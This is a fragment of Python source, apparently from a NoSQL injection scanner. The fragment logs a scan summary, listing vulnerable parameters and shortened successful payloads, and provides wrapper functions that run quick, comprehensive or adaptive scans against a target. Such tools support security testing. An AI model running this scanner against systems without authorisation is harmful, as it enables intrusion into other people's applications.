        self.logger.info("NOSQL INJECTION SCAN SUMMARY")
        self.logger.info(f"Target: {scan_results['target'].get('url')}")
        self.logger.info(f"Detection mode: {scan_results['detection_mode']}")
        self.logger.info(f"Detected databases: {', '.join(scan_results['detected_databases']) or 'None'}")
        self.logger.info(f"Parameters tested: {len(scan_results['parameters_tested'])}")
        self.logger.info(f"Vulnerabilities found: {scan_results['vulnerability_count']}")
        self.logger.info(f"Scan duration: {scan_results.get('scan_duration', 0):.2f}s")
        
        if scan_results['vulnerability_count'] > 0:
            self.logger.info("Vulnerable parameters:")
            for vuln in scan_results['vulnerable_parameters']:
                self.logger.info(f"  - {vuln['parameter']} (confidence: {vuln['confidence']:.3f})")
                for successful in vuln.get('successful_payloads', [])[:1]:
                    payload_type = successful.get('payload_type', 'unknown')
                    self.logger.info(f"    Type: {payload_type}, Payload: {successful['payload'][:60]}...")
        
        self.logger.info("=" * 60)

    def close(self):
        """Clean up resources."""
        self.http_session.close()

# Convenience functions
def run_nosql_injection_scan(target_config: Dict[str, Any], scan_type: str = 'comprehensive',
                            detector_config: Dict[str, Any] = None,
                            use_webdriver: bool = False,
                            custom_payloads: List[str] = None):

    enriched_target = target_config
    detector = AdvancedNoSQLInjectionDetector(detector_config or {})

    try:
        if scan_type == 'quick':
            detector.sample_size = 2
            return detector.adaptive_scan(enriched_target)

        elif scan_type == 'comprehensive':
            return detector.comprehensive_scan(enriched_target)

        elif scan_type == 'adaptive':
            return detector.adaptive_scan(enriched_target)

        else:
            raise ValueError(f"Unknown scan type: {scan_type}")

    finally:
        detector.close()

def get_detection_modes():
    """Get available detection modes."""
    return DETECTION_MODES

def get_supported_databases():
    """Get supported NoSQL databases."""
    return NOSQL_DATABASES

def detect_nosql_from_response(response_text: str, headers: Dict) -> str:
    """Detect NoSQL database from response text and headers."""
    return detect_nosql_database(response_text, headers)